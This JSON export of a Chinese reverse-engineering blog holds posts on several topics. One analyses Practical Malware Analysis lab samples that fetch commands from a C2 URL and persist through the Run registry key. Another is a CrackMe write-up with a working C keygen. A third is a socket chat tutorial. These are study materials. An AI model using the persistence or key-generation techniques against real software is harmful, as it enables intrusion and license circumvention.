{"meta":{"title":"b1ackie'blog","subtitle":"","description":"","author":"b1ackie","url":"https://b1ack1e.github.io","root":"/"},"pages":[{"title":"about","date":"2021-08-09T07:43:02.000Z","updated":"2021-08-09T08:42:32.202Z","comments":false,"path":"about/index.html","permalink":"https://b1ack1e.github.io/about/index.html","excerpt":"","text":"b1ackie from satter"}],"posts":[{"title":"恶意代码分析实战-实验6","slug":"恶意代码分析实战-实验6","date":"2021-08-10T07:52:15.000Z","updated":"2021-08-10T10:44:03.802Z","comments":true,"path":"2021/08/10/恶意代码分析实战-实验6/","link":"","permalink":"https://b1ack1e.github.io/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/","excerpt":"","text":"Lab 6-11.由main函数调用的唯一子过程中发现的主要代码结构是什么？使用IDA找到main函数看到调用了一个子函数sub_401000，F5即可看到伪代码。 可以看到调用了InternetGetConnectedState这个API，这个函数是用来检测是否联网的，判断本地网络状态。 1234BOOL InternetGetConnectedState( LPDWORD lpdwFlags, DWORD dwReserved); 当存在一个连接时返回TRUE，否则返回FALSE。 2.位于0x40105F的子过程是什么？ 这样确实看不太出来是做什么的。 这样看可以看到成功或者失败分别会压入栈不同的文字然后调用。 再看实际运行情况，推测应该是一个printf函数。 3.这个程序的目的是什么？通过上面的函数分析可以得知，这是一个判断是否有网络连接的程序。如果存在网络连接返回1，否则返回0。 Lab 6-21.main函数调用的第一个子过程执行了什么操作？调用的第一个函数是sub_401000，调用了InternetGetConnectedState这个API判断当前是否连接了网络 2.位于0x40117F的子过程是什么？查看此函数，发现与lab6-1是一样的，所以是一个printf函数。 3.被main函数调用的第二个子过程做了什么？首先调用了InternetOpenA初始化应用程序对 WinINet 函数的使用。 然后调用了InternetOpenUrlA下载“http://www.practicalmalwareanalysis.com/cc.htm”这个页面 再调用InternetReadFile读取数据，如果读取的前几个字符是“&lt;!–”就成功，如果失败就会打印“Error 2.3: Fail to get command”，读取失败会打印“Error 2.2: Fail to ReadFile” openurl失败会打印“Error 2.1: Fail to OpenUrl” 再仔细分析一下返回值，可以看到前几个值如果比对都正确的话，那么会把第五个字符给al，而前几个字符是html页面的注释，也就是读取注释的第一个字符。 这个函数结束之后，可以看出来后al的值会再次赋给[EBP+var_8]，最终会传给ecx，再压入栈作为printf的一个参数。可以看到压入栈一句话”Success: Parsed command is %c\\n”，%c对应的就是这个值，打印出这个字符。 4.在这个子过程中使用了什么类型的代码结构？if-else的结构 5.在这个程序中有任何基于网络的指示吗？使用了Internet Explorer 7.5/pma作为InternetOpenA函数lpszAgent参数的值，还有http://www.practicalmalwareanalysis.com/cc.htm这个URL。 6.这个恶意代码的目的是什么？首先判断是否联网，如果联网那么就会开始读取http://www.practicalmalwareanalysis.com/cc.htm这个页面的，然后获取注释的第一个字符，最后将其打印出来，再调用sleep函数 Lab 6-31.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？多了一个函数sub_401130函数 这个新函数是通过读取到的值来执行不同的操作。 2.这个新函数使用的参数是什么？使用的参数是通过读取网页资源注释中得到的字符，还有一个是main函数的参数argv[0]，就是程序名本身。 3.这个函数包含的主要代码结构是什么？包含的主要结构式switch结构 4.这个函数能够做什么首先当字符等于“a”时，可以创建一个文件夹路径是C:\\TEMP 当字符等于“b”时，会将自身复制到创建文件夹内，并且重命名为cc.exe 等于“c”时，会删除文件夹下的cc.exe。 等于“d”时，会实现一个自启动功能，在HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run下写入键值 通过注册表实现自启动可以看这里：自启动技术-注册表 12345678910111213140040118F |. 51 push ecx ; /pHandle = kernel32.75B5483B00401190 |. 68 3F000F00 push 0xF003F ; |Access = KEY_ALL_ACCESS00401195 |. 6A 00 push 0x0 ; |Reserved = 0x000401197 |. 68 70714000 push Lab06-03.00407170 ; |Software\\Microsoft\\Windows\\CurrentVersion\\Run0040119C |. 68 02000080 push 0x80000002 ; |hKey = HKEY_LOCAL_MACHINE004011A1 |. FF15 04604000 call dword ptr ds:[&lt;&amp;ADVAPI32.RegOpenKey&gt;; \\RegOpenKeyExA004011A7 |. 6A 0F push 0xF ; /BufSize = F (15.)004011A9 |. 68 A0714000 push Lab06-03.004071A0 ; |C:\\Temp\\cc.exe004011AE |. 6A 01 push 0x1 ; |ValueType = REG_SZ004011B0 |. 6A 00 push 0x0 ; |Reserved = 0x0004011B2 |. 68 68714000 push Lab06-03.00407168 ; |Malware004011B7 |. 8B55 FC mov edx,dword ptr ss:[ebp-0x4] ; |004011BA |. 52 push edx ; |hKey = 0x23C004011BB |. FF15 00604000 call dword ptr ds:[&lt;&amp;ADVAPI32.RegSetValu&gt;; \\RegSetValueExA 等于“e”的时候，调用sleep函数 都不满足的话就打印字符串“Error 3.2: Not a valid command provided” 5.这个恶意代码中有什么本地特征吗？有，就是前面分析的注册表键值的修改，还有对于文件夹的创建和文件的复制。 6.这个恶意代码的目的是什么？判断网络是否连接，然后读取一个网页资源中的注释后的第一个字符，通过这个字符来判断进行何种操作。具体上面已经分析过了。 Lab 6-41.在实验6-3和6-4的main函数中的调用之间的区别是什么？加了一个for循环，sub_401040加了一个参数i。 2.什么新的代码结构已经被添加到main中for循环结构 3.这个实验的解析HTML的函数和前面实验中的那些有什么区别主要是给InternetOpenA传入的szAgent参数不一样，这个参数先通过sprintf将“Internet Explorer 7.50/pma”与循环次数i拼接起来。第一次是Internet Explorer 7.50/pma0第二次是Internet Explorer 7.50/pma1…以此类推。 4.这个程序会运行多久？（假设它已经连接到互联网）看这个for循环，每次都会sleep，其中参数是6000ms，是一分钟，也就是每循环一次沉睡一分钟，那么就是1440分钟。 5.在这个恶意代码中有什么新的基于网络的迹象吗？就是InternetOpenA传入的szAgent参数不同了，每次都会变。 6.这个恶意代码的目的是什么？跟之前的基本一样，只是运行的时间变得特别长。","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ack1e.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ack1e.github.io/tags/Lab/"}]},{"title":"160CrackMe-009","slug":"160CrackMe-009","date":"2021-08-09T10:00:15.000Z","updated":"2021-08-09T10:54:17.471Z","comments":true,"path":"2021/08/09/160CrackMe-009/","link":"","permalink":"https://b1ack1e.github.io/2021/08/09/160CrackMe-009/","excerpt":"","text":"前言这个VB的程序，调用的时候都是传入一个地址，然后地址直接查看是什么也看不到，没有什么有用的，分析起来看得人一头雾水。查了资料之后才知道，VB的变量特征是前两个4字节都是一些数据类型，第三个四字节才是变量，相当于是首地址+0x8的地方。 比如此时寄存器中值是18F3F4，它实际存储的值是18F3FC处的数据。 初探打开程序，看到需要输入name和key输入后弹出错误的提示框。 分析查壳，无壳是用VB语言写的。 使用OD搜索错误提示的字符串可以搜索到直接定位到关键跳转。在函数头部下断开始分析。 先获取了输入的name的长度，但是这个长度后面好像是没有参加任何运算的，我没有分析到有参加运算的地方。 123456789101112131415161718004020EF . 51 push ecx ; /Step8 = 0018F3E0004020F0 . 8D45 94 lea eax,dword ptr ss:[ebp-0x6C] ; |004020F3 . BB 02000000 mov ebx,0x2 ; |004020F8 . 52 push edx ; |/var18 = 0018F3BC004020F9 . 50 push eax ; ||retBuffer8 = 0018F3CC004020FA . 899D 54FFFFFF mov dword ptr ss:[ebp-0xAC],ebx ; ||00402100 . 899D 44FFFFFF mov dword ptr ss:[ebp-0xBC],ebx ; ||00402106 . FF15 18414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenVa&gt;; |\\__vbaLenVar0040210C . 8D8D 44FFFFFF lea ecx,dword ptr ss:[ebp-0xBC] ; |00402112 . 50 push eax ; |End8 = 0018F3CC00402113 . 8D95 E8FEFFFF lea edx,dword ptr ss:[ebp-0x118] ; |00402119 . 51 push ecx ; |Start8 = 0018F3E00040211A . 8D85 F8FEFFFF lea eax,dword ptr ss:[ebp-0x108] ; |00402120 . 52 push edx ; |TMPend8 = 0018F3BC00402121 . 8D4D DC lea ecx,dword ptr ss:[ebp-0x24] ; |00402124 . 50 push eax ; |TMPstep8 = 0018F3CC00402125 . 51 push ecx ; |Counter8 = 0018F3E000402126 . FF15 20414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \\__vbaVarForInit 首先是对于name 的操作，获取了每一位的ascii码值，然后相加。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495000402134 . /0F84 9C000000 je Andréna.004021D60040213A . |8D55 94 lea edx,dword ptr ss:[ebp-0x6C]0040213D . |8D45 DC lea eax,dword ptr ss:[ebp-0x24]00402140 . |52 push edx00402141 . |50 push eax00402142 . |C745 9C 01000&gt;mov dword ptr ss:[ebp-0x64],0x100402149 . |895D 94 mov dword ptr ss:[ebp-0x6C],ebx0040214C . |FF15 90414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaI4Var&gt;; Msvbvm50.__vbaI4Var00402152 . |8D4D BC lea ecx,dword ptr ss:[ebp-0x44] ; |00402155 . |50 push eax ; |Start = 0x18F3CC00402156 . |8D55 84 lea edx,dword ptr ss:[ebp-0x7C] ; |00402159 . |51 push ecx ; |dString8 = 0018F3E00040215A . |52 push edx ; |RetBUFFER = 0018F3BC0040215B . |FF15 38414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#632&gt;] ; \\获取每一位00402161 . |8D45 84 lea eax,dword ptr ss:[ebp-0x7C]00402164 . |8D4D A8 lea ecx,dword ptr ss:[ebp-0x58]00402167 . |50 push eax ; /String8 = 0018F3CC00402168 . |51 push ecx ; |ARG2 = 0018F3E000402169 . |FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrVa&gt;; \\__vbaStrVarVal0040216F . |50 push eax ; /String = &quot;\u0002&quot;00402170 . |FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; \\转为ascii00402176 . |66:8985 4CFFF&gt;mov word ptr ss:[ebp-0xB4],ax0040217D . |8D55 CC lea edx,dword ptr ss:[ebp-0x34]00402180 . |8D85 44FFFFFF lea eax,dword ptr ss:[ebp-0xBC]00402186 . |52 push edx ; /var18 = 0018F3BC00402187 . |8D8D 74FFFFFF lea ecx,dword ptr ss:[ebp-0x8C] ; |0040218D . |50 push eax ; |var28 = 0018F3CC0040218E . |51 push ecx ; |saveto8 = 0018F3E00040218F . |899D 44FFFFFF mov dword ptr ss:[ebp-0xBC],ebx ; |00402195 . |FF15 94414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarAd&gt;; \\相加0040219B . |8BD0 mov edx,eax0040219D . |8D4D CC lea ecx,dword ptr ss:[ebp-0x34]004021A0 . |FFD6 call esi ; Msvbvm50.__vbaVarMove004021A2 . |8D4D A8 lea ecx,dword ptr ss:[ebp-0x58]004021A5 . |FF15 B8414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; Msvbvm50.__vbaFreeStr004021AB . |8D55 84 lea edx,dword ptr ss:[ebp-0x7C]004021AE . |8D45 94 lea eax,dword ptr ss:[ebp-0x6C]004021B1 . |52 push edx004021B2 . |50 push eax004021B3 . |53 push ebx004021B4 . |FFD7 call edi ; Msvbvm50.__vbaFreeVarList004021B6 . |83C4 0C add esp,0xC004021B9 . |8D8D E8FEFFFF lea ecx,dword ptr ss:[ebp-0x118]004021BF . |8D95 F8FEFFFF lea edx,dword ptr ss:[ebp-0x108]004021C5 . |8D45 DC lea eax,dword ptr ss:[ebp-0x24]004021C8 . |51 push ecx ; /TMPend8 = 0018F3E0004021C9 . |52 push edx ; |TMPstep8 = 0018F3BC004021CA . |50 push eax ; |Counter8 = 0018F3CC004021CB . |FF15 AC414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \\__vbaVarForNext004021D1 .^|E9 5CFFFFFF jmp Andréna.00402132 然后所有name相加的结果乘以0x499602D2 123456789004021D6 &gt; \\8D4D CC lea ecx,dword ptr ss:[ebp-0x34]004021D9 . 8D95 54FFFFFF lea edx,dword ptr ss:[ebp-0xAC]004021DF . 51 push ecx ; /var18 = 0018F404004021E0 . 8D45 94 lea eax,dword ptr ss:[ebp-0x6C] ; |004021E3 . 52 push edx ; |var28 = 0018F38C004021E4 . 50 push eax ; |SaveTo8 = 0018F3CC004021E5 . C785 5CFFFFFF&gt;mov dword ptr ss:[ebp-0xA4],0x499602D2 ; |004021EF . C785 54FFFFFF&gt;mov dword ptr ss:[ebp-0xAC],0x3 ; |004021F9 . FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarMu&gt;; \\__vbaVarMul 这个值再转为十进制的字符串。 可以看到这个值和计算器计算出来的是一样的。 最后就是使用“-”替换到第四位和第九位的字符。 1234567891011121314151617181900402206 . 8B1D A0414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaMi&gt;; Msvbvm50.__vbaMidStmtVar0040220C . 8D4D CC lea ecx,dword ptr ss:[ebp-0x34]0040220F . 51 push ecx00402210 . 6A 04 push 0x400402212 . 8D95 54FFFFFF lea edx,dword ptr ss:[ebp-0xAC]00402218 . 6A 01 push 0x10040221A . 52 push edx0040221B . C785 5CFFFFFF&gt;mov dword ptr ss:[ebp-0xA4],Andréna.0040&gt;; -00402225 . C785 54FFFFFF&gt;mov dword ptr ss:[ebp-0xAC],0x80040222F . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaMidStmtVar&gt;00402231 . 8D45 CC lea eax,dword ptr ss:[ebp-0x34]00402234 . 8D8D 54FFFFFF lea ecx,dword ptr ss:[ebp-0xAC]0040223A . 50 push eax0040223B . 6A 09 push 0x90040223D . 6A 01 push 0x10040223F . 51 push ecx00402240 . C785 5CFFFFFF&gt;mov dword ptr ss:[ebp-0xA4],Andréna.0040&gt;; -0040224A . C785 54FFFFFF&gt;mov dword ptr ss:[ebp-0xAC],0x800402254 . FFD3 call ebx 下面开始编写注册机 注册机编写根据以上分析的结果 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int main()&#123; printf(&quot;输入name\\n&quot;); char name[20]; gets_s(name); long long key = 0; int len = strlen(name); for (int i = 0; i &lt; len; i++) &#123; key += name[i]; &#125; key *= 0x499602D2; char buf[30]; sprintf(buf, &quot;%lld&quot;, key); buf[3] = &#x27;-&#x27;; buf[8] = &#x27;-&#x27;; printf(&quot;你的key是：\\n%s&quot;, buf); return 0;&#125; 总结分析起来不难，主要是VB的特性让人很折磨。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"传输技术-SOCKET通信","slug":"传输技术-SOCKET通信","date":"2021-08-06T11:35:59.000Z","updated":"2021-08-09T10:51:36.524Z","comments":true,"path":"2021/08/06/传输技术-SOCKET通信/","link":"","permalink":"https://b1ack1e.github.io/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/","excerpt":"","text":"SOCKET通信socket也被叫做“套接字”，应用程序通常通过“套接字”向网络发出请求或者接收请求。socket表示是：IP地址加上端口号，如127.0.0.1:8080。Socket编程有两种通信协议可以选择，一种是TCP，另一种是UDP。先来说一下基于TCP的Socket编程。 基于TCP Socket编程TCP是一种基于连接的协议，在进行通信之前，必须要建立连接，其中服务端监听请求，客户端发送请求。当建立好了连接之后，就可以开始通信了。 函数介绍Socket根据指定的地址族、数据类型和协议来分配一个套接口的描述字及其所有资源的函数。 1234SOCKET socket ( _In_ int af, _In_ int type, _In_ int protocol); af：指定地址族规范。地址系列的可能值在Winsock2.h头文件中定义。当前支持AF_INET或者AF_INET6，它们是IPV4和IPV6的互联网地址族格式。 type：指定socket类型，SOCK_STREAM类型指定产生流式套接字，SOCK_DGRAM类型指定产生数据报式套接字，而SOCK_RAW类型指定产生原始套接字（只有管理员权限的用户可以创建原始套接字）。 protocol：与特定地址家族相关的协议IPPROTO_TCP、IPPROTO_UP、IPPROTO_IP，如果指定为0，那么系统会根据地址格式和套接字类别，自动选择一个合适的协议。 返回值：如果没有发生错误，则套接字返回引用新套接字的描述符，否则返回INVALID_SOCKET。 bind将本地地址与套接字相关联 12345int bind( SOCKET s, const sockaddr *addr, int namelen); s：标识未绑定套接字的描述符。 addr：指向要分配给绑定套接字的本地地址的sockaddr结构的指针。 namelen：name参数指向值的长度。 返回值：如果没有发生错误，则bind返回0，否则返回SOCKET_ERROR。 htons将整型变量从主机字节顺序转变成网络字节顺序，就是整数在地址空间中的存储方式变为高位字节存放在内存的低地址处。 123u_short htons( u_short hostshort); hostshort：指定主机字节顺序为16位。 返回值：返回TCP/IP网络字节顺序。 inet_addr将一个点分十进制的IP转换成一个长整型数。 123unsigned long inet_addr( const char *cp); 返回值：如果没有发生错误，返回一个无符号长整型值，其中包含给定互联网地址的适当的二进制表示形式。 listen函数将一个套接字置于正在监听传入连接的状态。 123int listen ( _In_ SOCKET s, _In_ int backlog); s：标识绑定的未连接套接字的描述符。 backlog：指定待连接队列的最大长度。如果设置为SOMAXCONN，则负责套接字的底层服务提供商将积压设置为最大合理值。如果设置为SOMAXCONN_HINT(N)（其中N是数字），则积压值为N，调整范围（200,65535）。 返回值：如没有发生错误，返回0，否则返回SOCKET_ERROR。 accept允许在套接字上尝试连接 1234SOCKET accept ( _In_ SOCKET s, _Out_writes_bytes_opt_(*addrlen) struct sockaddr FAR *addr, _Inout_opt_ int FAR *addrlen); s：描述符，用于标识使用listen功能并处于侦听状态的套接字。连接实际上是由accept返回的套接字。 addr：指定一个可选缓冲区的指针，它接受通信层中已知连接实体的地址。addr参数的确切格式由创建sockaddr结构的套接字时建立的地址族来确定。 addrlen：指向一个整数的可选指针，其中包含由addr参数指向的结构长度。 返回值：如果没有发生错误，则accept返回一个SOCKET类型的值，该值是新套接字的描述符。此返回值是实际连接所在的套接字的句柄。否则返回INVALID_SOCKET。 send在建立连接的套接字上发送数据 12345int send ( _In_ SOCKET s, _In_reads_bytes_(len) const char FAR * buf, _In_ int len, _In_ int flags); s：标识连接的套接字的描述符。 buf：指向要发送的数据缓冲区的指针。 len：由buf参数指向缓冲区中数据的长度。 flags：指定一组调用方式的标志，一般置为0。 返回值：如果没有发生错误，返回发送的字节数，否则返回SOCKET_ERROR。 recv从连接的套接字或绑定的无连接套接字中接收数据。 12345int recv ( _In_ SOCKET s, _Out_writes_bytes_to_(len, return) __out_data_source(NETWORK) char FAR * buf, _In_ int len, _In_ int flags); s：标识连接的套接字的描述符。 buf：指向缓冲区的指针，用于接收传入的数据。 len：由buf参数指向缓冲区中数据的长度。 flags：指定一组调用方式的标志，一般置为0。 返回值，如果没有发生错误，则recv返回接收到的字节数，由buf参数指向的缓冲区将包含接收到的数据。如果连接已经正常关闭，则返回值为0. 实现原理客户端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，调用bind函数绑定，再调用listen函数进行监听。当有连接请求时，调用accept函数接收连接请求。建立连接后，使用recv和send函数进行通信。 服务端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，然后调用connect函数发送连接请求，建立连接后，使用recv和send函数进行通信。 服务端代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;//#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;)BOOL SocketBindAndListen(char* lpszIP, int Port);void AcceptRecvMsg();void SendMsg(char* pszSend);UINT RecvThreadProc(LPVOID lpVoid);SOCKET g_ServerSocket;SOCKET g_ClientSocket;int main() &#123; if (SocketBindAndListen(&quot;IP地址&quot;, 12345) == FALSE) &#123; printf(&quot;建立连接失败\\n&quot;); return -1; &#125; printf(&quot;连接建立成功，开始通信\\n&quot;); char szSendmsg[MAX_PATH] = &#123; 0 &#125;; while (1) &#123; gets_s(szSendmsg); SendMsg(szSendmsg); &#125; return 0;&#125;BOOL SocketBindAndListen(char* lpszIP, int Port)&#123; //初始化winsock库 WSADATA wsaData = &#123; 0 &#125;; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //创建套接字 g_ServerSocket = socket(AF_INET, SOCK_STREAM, 0); sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(Port); addr.sin_addr.S_un.S_addr = inet_addr(lpszIP); //绑定IP和端口 if (bind(g_ServerSocket, (sockaddr*)(&amp;addr), sizeof(addr)) == SOCKET_ERROR) &#123; return FALSE; &#125; //设置监听 if (listen(g_ServerSocket, 1) == SOCKET_ERROR) &#123; return FALSE; &#125; CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RecvThreadProc, NULL, NULL, NULL); return TRUE;&#125;void AcceptRecvMsg()&#123; sockaddr_in addr = &#123; 0 &#125;; int len = sizeof(addr); g_ClientSocket = accept(g_ServerSocket, (sockaddr*)(&amp;addr), &amp;len); printf(&quot;接收客户端连接请求\\n&quot;); char szBuffer[MAX_PATH] = &#123; 0 &#125;; while (1) &#123; //接收数据 int Ret = recv(g_ClientSocket, szBuffer, MAX_PATH, 0); if (Ret &lt;= 0) &#123; continue; &#125; printf(&quot;接收到数据：%s\\n&quot;, szBuffer); &#125;&#125;void SendMsg(char* pszSend)&#123; send(g_ClientSocket, pszSend, (1 + strlen(pszSend)), 0); printf(&quot;发送数据：%s\\n&quot;, pszSend);&#125;UINT RecvThreadProc(LPVOID lpVoid) &#123; AcceptRecvMsg(); return 0;&#125; 客户端代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;//#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;)SOCKET g_ServerSocket;BOOL Connection(char* lpszServerIP, int ServerPort);void SendMsg(char* pszSend);void RecvMsg();UINT RecvThreadProc(LPVOID lpVoid);int main()&#123; printf(&quot;请输入服务器IP\\n&quot;); char ipaddr[32] = &#123; 0 &#125;; gets_s(ipaddr); if (Connection(ipaddr, 12345) == FALSE) &#123; printf(&quot;建立连接失败\\n&quot;); getchar(); return -1; &#125; printf(&quot;建立连接成功，开始通信\\n&quot;); char szSend[MAX_PATH] = &#123; 0 &#125;; while (1) &#123; gets_s(szSend); SendMsg(szSend); &#125; return 0;&#125;BOOL Connection(char* lpszServerIP, int ServerPort)&#123; WSADATA wsaData = &#123; 0 &#125;; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); g_ServerSocket = socket(AF_INET, SOCK_STREAM, 0); if (g_ServerSocket == INVALID_SOCKET) &#123; return FALSE; &#125; sockaddr_in addr = &#123; 0 &#125;; addr.sin_family = AF_INET; addr.sin_port = htons(ServerPort); addr.sin_addr.S_un.S_addr = inet_addr(lpszServerIP); if (connect(g_ServerSocket, (sockaddr*)(&amp;addr), sizeof(addr))) &#123; return FALSE; &#125; CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RecvThreadProc, NULL, NULL, NULL); return TRUE;&#125;void SendMsg(char* pszSend) &#123; send(g_ServerSocket, pszSend, (1 + strlen(pszSend)), 0); printf(&quot;发送消息：%s\\n&quot;,pszSend);&#125;void RecvMsg() &#123; char szBuffer[MAX_PATH] = &#123; 0 &#125;; while (1) &#123; int ret = recv(g_ServerSocket, szBuffer, MAX_PATH, 0); if (ret &lt;= 0) &#123; continue; &#125; printf(&quot;接收到消息：%s\\n&quot;, szBuffer); &#125;&#125;UINT RecvThreadProc(LPVOID lpVoid) &#123; RecvMsg(); return 0;&#125; 测试服务端 客户端 基于UDP Socket编程函数介绍sendto将数据发送到特定的目的地 12345678int sendto( SOCKET s, const char *buf, int len, int flags, const sockaddr *to, int tolen); s：标识套接字的描述符。 buf：指向要发送的数据缓冲区的指针。 len：由buf参数指向的数据长度。 flags：指定一组调用方式的标志，一般为0。 to：指向包含目标套接字地址的sockaddr结构的可选指针。 tolen：由to参数指向的地址的大小。 返回值：如果没有发生错误，返回发送的总字节数，否则返回SOCKET_ERROR。 recvfrom接收数据报并存储源地址 12345678int recvfrom( SOCKET s, char *buf, int len, int flags, sockaddr *from, int *fromlen); s：标识套接字的描述符。 buf：指定传入数据的缓冲区。 len：由buf参数指向的数据长度。 flags：指定一组调用方式的标志，一般为0。 from：指向sockaddr结构中的缓冲区的可选指针，它将在返回时保存源地址。 fromlen：由from参数指向的地址的大小。 返回值：如果没有发生错误，返回接收到的总字节数，否则返回SOCKET_ERROR。 实现原理UDP的通信框架比起TCP更加简单，UDP是基于无连接的通信，它可以直接使用sendto和recvfrom函数进行数据的发送与接收。 服务端：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354BOOL bind() &#123; WSADATA wsaData; WORD sockVersion = MAKEWORD(2, 2); if (WSAStartup(sockVersion, &amp;wsaData) != 0) &#123; return 0; &#125; serSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); if (serSocket == INVALID_SOCKET) &#123; printf(&quot;socket 错误\\n&quot;); return 0; &#125; sockaddr_in serAddr; serAddr.sin_family = AF_INET; serAddr.sin_port = htons(12345); serAddr.sin_addr.S_un.S_addr = inet_addr(&quot;IP地址&quot;); if (bind(serSocket, (sockaddr*)&amp;serAddr, sizeof(serAddr)) == SOCKET_ERROR) &#123; printf(&quot;绑定失败\\n&quot;); closesocket(serSocket); return 0; &#125; return 1;&#125;int main()&#123; if (bind() == FALSE) &#123; printf(&quot;wrong&quot;); return -1; &#125; printf(&quot;开始通信\\n&quot;); sockaddr_in remoteAddr; int nAddrLen = sizeof(remoteAddr); while (true) &#123; char recvData[MAX_PATH]; int ret = recvfrom(serSocket, recvData, MAX_PATH, 0, (sockaddr*)&amp;remoteAddr, &amp;nAddrLen); if (ret &gt; 0) &#123; recvData[ret] = 0x00; printf(&quot;接收到信息：%s\\n&quot;,recvData); &#125; char sendData[MAX_PATH] = &#123; 0 &#125;; gets_s(sendData); printf(&quot;发送数据：%s\\n&quot;, sendData); sendto(serSocket, sendData, strlen(sendData), 0, (sockaddr*)&amp;remoteAddr, nAddrLen); &#125; return 0;&#125; 服务端：12345678910111213141516171819202122232425262728293031323334353637383940BOOL bind() &#123; WORD socketVersion = MAKEWORD(2, 2); WSADATA wsaData; if (WSAStartup(socketVersion, &amp;wsaData) != 0) &#123; return 0; &#125; sclient = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); return 1;&#125;int main()&#123; if (bind() == FALSE) &#123; printf(&quot;wrong\\n&quot;); return -1; &#125; printf(&quot;开始通信\\n&quot;); sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(12345); sin.sin_addr.S_un.S_addr = inet_addr(&quot;IP地址&quot;); int len = sizeof(sin); while (1) &#123; char sendData[MAX_PATH] = &#123; 0 &#125;; gets_s(sendData); printf(&quot;发送数据：%s\\n&quot;, sendData); sendto(sclient, sendData, strlen(sendData), 0, (sockaddr*)&amp;sin, len); char recvData[MAX_PATH]; int ret = recvfrom(sclient, recvData, MAX_PATH, 0, (sockaddr*)&amp;sin, &amp;len); if (ret &gt; 0) &#123; recvData[ret] = 0x00; printf(&quot;接收到信息：%s\\n&quot;,recvData); &#125; &#125; return 0;&#125; 测试 参考《Windows黑客编程技术详解》","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"传输技术","slug":"传输技术","permalink":"https://b1ack1e.github.io/tags/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF/"},{"name":"SOCKET编程","slug":"SOCKET编程","permalink":"https://b1ack1e.github.io/tags/SOCKET%E7%BC%96%E7%A8%8B/"}]},{"title":"压缩技术-windows压缩API","slug":"压缩技术-windows压缩API","date":"2021-08-06T05:46:31.000Z","updated":"2021-08-09T10:51:56.697Z","comments":true,"path":"2021/08/06/压缩技术-windows压缩API/","link":"","permalink":"https://b1ack1e.github.io/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/","excerpt":"","text":"压缩技术为了实现windows上的数据压缩和解压缩，最方便的方法就是直接调用win32API函数。windows系统的ntdll专门提供了RtlCompressBuffer和RtlDecompressBuffer函数来负责数据压缩和解压缩操作。 函数介绍RtlGetCompressionWorkSpaceSize确定RtlCompressBuffer和RtlDecompressBuffer函数工作空间缓冲区的正确大小。 12345NT_RTL_COMPRESS_API NTSTATUS RtlGetCompressionWorkSpaceSize( USHORT CompressionFormatAndEngine, PULONG CompressBufferWorkSpaceSize, PULONG CompressFragmentWorkSpaceSize); 